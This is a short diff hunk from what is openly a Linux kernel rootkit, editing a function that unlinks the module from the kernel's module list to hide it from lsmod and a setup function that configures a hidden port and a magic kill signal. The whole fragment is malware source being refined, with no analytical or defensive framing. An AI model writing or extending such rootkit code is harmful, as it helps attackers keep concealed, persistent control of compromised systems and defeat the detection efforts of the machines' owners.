@@ -79,14 +79,14 @@ static struct ftrace_hook all_hooks[] = {
 
 // Hide module from lsmod
 static void hide_module(void) {
-    if (THIS_MODULE && THIS_MODULE->list.prev) {
+    if (THIS_MODULE->list.prev) {
         list_del(&THIS_MODULE->list);
         hidden = 1;
     }
 }
 
 // Initialize global configuration
-void init_rootkit_config(void) {
+static void init_rootkit_config(void) {
     // Set global variables that hooks will use
     set_hidden_port(HIDDEN_PORT);
     set_magic_signal(MAGIC_KILL_SIGNAL);
